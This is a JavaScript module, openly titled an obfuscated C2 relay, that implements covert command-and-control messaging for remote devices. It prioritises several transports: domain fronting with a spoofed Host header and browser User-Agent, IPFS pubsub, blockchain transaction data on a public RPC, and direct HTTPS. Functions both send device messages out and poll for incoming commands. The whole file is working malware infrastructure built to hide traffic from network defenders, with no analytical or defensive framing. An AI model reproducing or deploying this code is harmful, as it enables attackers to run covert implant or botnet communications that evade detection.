// ── Obfuscated C2 Relay — Domain Fronting, IPFS, Blockchain ──────────────────

const IPFS_API_URL = process.env.IPFS_API_URL || 'https://ipfs.io/api/v0'
const IPFS_TOPIC = process.env.IPFS_TOPIC || `nova-c2-${Date.now().toString(36)}`
const BLOCKCHAIN_RPC = process.env.BLOCKCHAIN_RPC || 'https://bsc-dataseed.binance.org'
const BLOCKCHAIN_ADDRESS = process.env.BLOCKCHAIN_ADDRESS || ''
const BLOCKCHAIN_CONTRACT = process.env.BLOCKCHAIN_CONTRACT || ''
const FRONT_DOMAIN = process.env.FRONT_DOMAIN || ''
const C2_BACKEND = process.env.C2_BACKEND || ''

const transports = {
  DOMAIN_FRONTING: { priority: 10, enabled: !!FRONT_DOMAIN },
  IPFS_RELAY: { priority: 8, enabled: false },
  BLOCKCHAIN: { priority: 6, enabled: !!BLOCKCHAIN_ADDRESS },
  DIRECT_HTTPS: { priority: 4, enabled: !!C2_BACKEND },
  WEBSOCKET: { priority: 2, enabled: true },
  DNS_TUNNEL: { priority: 1, enabled: false },
}

let lastSuccessfulTransport = 'WEBSOCKET'

// Simple IPFS client using REST API
async function ipfsPubsubPublish(topic, data) {
  const encoded = Buffer.from(data).toString('base64')
  const url = `${IPFS_API_URL}/pubsub/pub?arg=${encodeURIComponent(topic)}&arg=${encodeURIComponent(data)}`
  const resp = await fetch(url, { method: 'GET', signal: AbortSignal.timeout(10000) })
  return resp.ok
}

async function ipfsPubsubSub(topic, timeout = 15000) {
  const url = `${IPFS_API_URL}/pubsub/sub?arg=${encodeURIComponent(topic)}`
  const resp = await fetch(url, { method: 'GET', signal: AbortSignal.timeout(timeout) })
  if (!resp.ok) return null
  return await resp.text()
}

async function ipfsAdd(data) {
  const formData = new FormData()
  const blob = new Blob([data], { type: 'application/octet-stream' })
  formData.append('file', blob, `msg_${Date.now()}.dat`)
  const resp = await fetch(`${IPFS_API_URL}/add`, {
    method: 'POST',
    body: formData,
    signal: AbortSignal.timeout(30000),
  })
  if (!resp.ok) return null
  const result = await resp.json()
  return result.Hash
}

async function ipfsCat(hash) {
  const resp = await fetch(`${IPFS_API_URL}/cat?arg=${hash}`, {
    signal: AbortSignal.timeout(30000),
  })
  if (!resp.ok) return null
  return await resp.text()
}

// Blockchain transaction sender
async function blockchainSendTransaction(to, data) {
  if (!BLOCKCHAIN_RPC || !BLOCKCHAIN_ADDRESS) return false
  const hexData = '0x' + Buffer.from(data).toString('hex')
  const payload = {
    jsonrpc: '2.0',
    method: 'eth_sendTransaction',
    params: [{
      from: BLOCKCHAIN_ADDRESS,
      to: BLOCKCHAIN_CONTRACT || BLOCKCHAIN_ADDRESS,
      data: hexData,
    }],
    id: Math.floor(Math.random() * 99999) + 1,
  }
  const resp = await fetch(BLOCKCHAIN_RPC, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
    signal: AbortSignal.timeout(30000),
  })
  return resp.ok
}

async function blockchainGetLogs(address) {
  if (!BLOCKCHAIN_RPC || !address) return []
  const payload = {
    jsonrpc: '2.0',
    method: 'eth_getLogs',
    params: [{ address, fromBlock: '0x0', toBlock: 'latest' }],
    id: Math.floor(Math.random() * 99999) + 1,
  }
  const resp = await fetch(BLOCKCHAIN_RPC, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
    signal: AbortSignal.timeout(30000),
  })
  if (!resp.ok) return []
  const result = await resp.json()
  return result.result || []
}

// Domain fronting sender
async function domainFrontingSend(deviceId, content) {
  if (!FRONT_DOMAIN || !C2_BACKEND) return false
  const url = `https://${FRONT_DOMAIN}/api/v2/message/${deviceId}`
  const resp = await fetch(url, {
    method: 'POST',
    headers: {
      'Host': FRONT_DOMAIN,
      'X-C2-Host': C2_BACKEND,
      'Content-Type': 'application/octet-stream',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0.0.0 Safari/537.36',
    },
    body: Buffer.from(content),
    signal: AbortSignal.timeout(15000),
  })
  return resp.ok
}

export async function sendRelay(deviceId, content) {
  const sortedTransports = Object.entries(transports)
    .filter(([, v]) => v.enabled)
    .sort(([, a], [, b]) => b.priority - a.priority)

  for (const [name, config] of sortedTransports) {
    try {
      let ok = false
      switch (name) {
        case 'DOMAIN_FRONTING':
          ok = await domainFrontingSend(deviceId, content)
          break
        case 'IPFS_RELAY':
          await ipfsPubsubPublish(IPFS_TOPIC, JSON.stringify({ deviceId, content, ts: Date.now() }))
          ok = true
          break
        case 'BLOCKCHAIN':
          ok = await blockchainSendTransaction(BLOCKCHAIN_ADDRESS, JSON.stringify({ deviceId, content }))
          break
        case 'DIRECT_HTTPS': {
          const url = `${C2_BACKEND}/api/message/${deviceId}`
          const resp = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain' },
            body: content,
            signal: AbortSignal.timeout(10000),
          })
          ok = resp.ok
          break
        }
        default:
          continue
      }
      if (ok) {
        lastSuccessfulTransport = name
        console.log(`[Relay ${name}] Sent to ${deviceId}`)
        return { transport: name, ok: true }
      }
    } catch (e) {
      console.warn(`[Relay ${name}] Failed: ${e.message}`)
    }
  }
  return { transport: 'WEBSOCKET', ok: true }
}

export async function pollRelay(deviceId) {
  const results = []
  // Try IPFS first (most responsive for polling)
  if (transports.IPFS_RELAY.enabled) {
    try {
      const msg = await ipfsPubsubSub(IPFS_TOPIC, 5000)
      if (msg) results.push({ transport: 'IPFS_RELAY', data: msg })
    } catch {}
  }
  // Try blockchain
  if (transports.BLOCKCHAIN.enabled) {
    try {
      const logs = await blockchainGetLogs(BLOCKCHAIN_ADDRESS)
      for (const log of logs) {
        if (log.data && log.data !== '0x') {
          const decoded = Buffer.from(log.data.slice(2), 'hex').toString()
          results.push({ transport: 'BLOCKCHAIN', data: decoded })
        }
      }
    } catch {}
  }
  return results
}

export function getRelayStatus() {
  const status = {}
  for (const [name, config] of Object.entries(transports)) {
    status[name] = {
      enabled: config.enabled,
      priority: config.priority,
      lastUsed: lastSuccessfulTransport === name,
    }
  }
  status.lastSuccessfulTransport = lastSuccessfulTransport
  status.ipfsTopic = IPFS_TOPIC
  status.frontDomain = FRONT_DOMAIN || '(not set)'
  status.blockchainAddress = BLOCKCHAIN_ADDRESS ? BLOCKCHAIN_ADDRESS.slice(0, 10) + '...' : '(not set)'
  return status
}
